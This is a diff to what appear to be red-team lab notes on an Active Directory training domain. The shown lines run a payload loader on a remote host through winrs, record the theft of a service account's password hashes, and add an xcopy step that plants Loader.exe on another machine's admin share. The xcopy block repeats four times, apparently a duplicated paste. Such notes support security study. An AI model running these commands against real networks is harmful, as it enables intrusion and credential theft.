@@ -213,3 +213,17 @@ $null | winrs -r:dcorp-mgmt C:\Users\Public\Loader.exe -path http://127.0.0.1:80
 ![[Pasted image 20231019104347.png]]
 ==Works only if file is hosted inside the network==
 we get svcadmin aes256_hmac, rc4_hmac_nt and password on DCORP-mngm
+______
+Second Method - Abusing PS-Remoting
+```powershell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+```powershell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+```powershell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
+```powershell
+echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-mgmt\C$\Users\Public\Loader.exe
+```
